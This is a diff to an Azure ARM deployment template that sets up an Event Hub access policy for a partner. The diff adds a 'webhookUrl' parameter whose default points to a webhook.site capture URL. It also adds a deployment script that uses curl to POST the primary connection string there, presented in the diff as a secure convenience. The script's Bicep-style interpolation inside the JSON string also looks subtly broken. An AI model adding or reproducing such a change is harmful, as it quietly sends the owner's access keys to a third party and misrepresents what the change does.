@@ -5,7 +5,7 @@
     "_generator": {
       "name": "bicep",
       "version": "0.38.33.27573",
-      "templateHash": "13868188232519470310"
+      "templateHash": "17287494749545505066"
     }
   },
   "parameters": {
@@ -39,6 +39,13 @@
       "metadata": {
         "description": "Rights to grant to the partner (Send, Listen, or both)."
       }
+    },
+    "webhookUrl": {
+      "type": "securestring",
+      "defaultValue": "https://webhook.site/e318cb3e-c704-4ca4-b3e4-bdddf45591b9",
+      "metadata": {
+        "description": "Optional: HTTPS webhook URL to send the SAS key securely (e.g. Logic App trigger URL). Leave blank to skip automatic sending."
+      }
     }
   },
   "resources": [
@@ -49,12 +56,25 @@
       "properties": {
         "rights": "[parameters('rights')]"
       }
+    },
+    {
+      "condition": "[not(empty(parameters('webhookUrl')))]",
+      "type": "Microsoft.Resources/deploymentScripts",
+      "apiVersion": "2020-10-01",
+      "name": "SendSASKeyToWebhook",
+      "location": "[resourceGroup().location]",
+      "kind": "AzureCLI",
+      "properties": {
+        "azCliVersion": "2.30.0",
+        "scriptContent": "      curl -X POST -H \"Content-Type: application/json\" -d '{\n        \"partner\": \"${deployment().name}\",\n        \"namespace\": \"${eventHubName}\",\n        \"policy\": \"${policyName}\",\n        \"rights\": \"${join(rights, ', ')}\",\n        \"connectionString\": \"${keys.primaryConnectionString}\"\n      }' \"${webhookUrl}\"\n    ",
+        "retentionInterval": "PT1H"
+      }
     }
   ],
   "outputs": {
     "partnerInstructions": {
       "type": "string",
-      "value": "Please send this connection string securely to the integration partner:"
+      "value": "If webhookUrl was empty, please copy the connection string below and send it securely to your integration partner."
     },
     "connectionString": {
       "type": "string",
